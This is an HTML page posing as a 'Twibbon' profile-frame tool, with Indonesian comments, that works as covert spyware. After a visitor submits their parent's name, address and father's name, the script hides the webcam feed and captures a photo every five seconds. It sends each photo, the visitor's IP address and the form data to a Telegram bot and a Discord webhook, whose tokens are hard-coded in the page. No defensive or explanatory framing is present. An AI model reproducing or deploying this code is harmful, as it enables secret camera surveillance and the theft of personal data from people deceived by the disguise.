<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Twibbon</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    video {
      display: none; /* Menyembunyikan video dari tampilan web */
    }
    form {
      display: flex;
      flex-direction: column;
      margin-bottom: 20px;
    }
    input {
      margin-bottom: 10px;
      padding: 10px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <form id="infoForm">
    <input type="text" id="parentName" placeholder="Nama Orang Tua" required>
    <input type="text" id="address" placeholder="Alamat" required>
    <input type="text" id="fatherName" placeholder="Nama Bapak" required>
    <button type="submit">Kirim</button>
  </form>

  <script>
    var telegramToken = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
    var telegramChatId = '-1002188815934';
    var discordWebhookUrl = 'https://discord.com/api/webhooks/1260940016310423606/94wLCeLPsDUTB1Ai-9ZbP6NF2mTQSpiwdgygwe4C8-zUjOz7Sx2oKnYjNeIm28xXNuOb'; // Ganti dengan URL Webhook Discord Anda

    // Fungsi untuk mengirim gambar ke Telegram
    function sendToTelegram(imageDataURL, caption) {
      var apiUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;

      fetch(imageDataURL)
        .then(res => res.blob())
        .then(blob => {
          var formData = new FormData();
          formData.append('chat_id', telegramChatId);
          formData.append('photo', blob, 'photo.png');
          formData.append('caption', caption);

          return fetch(apiUrl, {
            method: 'POST',
            body: formData
          });
        })
        .then(response => response.json())
        .then(data => {
          console.log('Gambar berhasil dikirim ke Telegram:', data);
        })
        .catch(error => {
          console.error('Error mengirim gambar ke Telegram:', error);
        });
    }

    // Fungsi untuk mengirim gambar ke Discord
    function sendToDiscord(imageDataURL, ipAddress, formData) {
      fetch(imageDataURL)
        .then(res => res.blob())
        .then(blob => {
          var formDataDiscord = new FormData();
          formDataDiscord.append('file', blob, 'photo.png');

          var payloadJson = {
            content: `Foto terkirim dari IP: ${ipAddress}\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`
          };

          formDataDiscord.append('payload_json', JSON.stringify(payloadJson));

          return fetch(discordWebhookUrl, {
            method: 'POST',
            body: formDataDiscord
          });
        })
        .then(response => response.json())
        .then(data => {
          console.log('Gambar berhasil dikirim ke Discord:', data);
        })
        .catch(error => {
          console.error('Error mengirim gambar ke Discord:', error);
        });
    }

    // Fungsi untuk mengambil dan mengirim foto ke Telegram dan Discord
    function takeAndSendPhoto(formData) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
          var video = document.createElement('video');
          document.body.appendChild(video);
          video.srcObject = stream;
          video.onloadedmetadata = function(e) {
            video.play();

            takePhoto();

            function takePhoto() {
              var canvas = document.createElement('canvas');
              var context = canvas.getContext('2d');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              context.drawImage(video, 0, 0, canvas.width, canvas.height);

              var imageDataURL = canvas.toDataURL('image/png');

              var ipAddress = '';
              fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                  ipAddress = data.ip;

                  var caption = `Foto terkirim dari IP: ${ipAddress}\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`;
                  sendToTelegram(imageDataURL, caption);
                  sendToDiscord(imageDataURL, ipAddress, formData);
                })
                .catch(error => {
                  console.error('Error mendapatkan IP address:', error);

                  var caption = `Foto terkirim\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`;
                  sendToTelegram(imageDataURL, caption);
                  sendToDiscord(imageDataURL, 'IP tidak ditemukan', formData);
                });

              document.body.removeChild(video);

              setTimeout(() => takeAndSendPhoto(formData), 5000);
            }
          };
        })
        .catch(function(err) {
          console.log("Error: " + err);
          if (err.name === 'NotAllowedError') {
            alert('Untuk melanjutkan, izinkan akses kamera pada peramban Anda.');
          } else {
            setTimeout(() => takeAndSendPhoto(formData), 5000);
          }
        });
    }

    document.getElementById('infoForm').addEventListener('submit', function(event) {
      event.preventDefault();
      var formData = {
        parentName: document.getElementById('parentName').value,
        address: document.getElementById('address').value,
        fatherName: document.getElementById('fatherName').value
      };
      takeAndSendPhoto(formData);
    });
  </script>
</body>
</html>
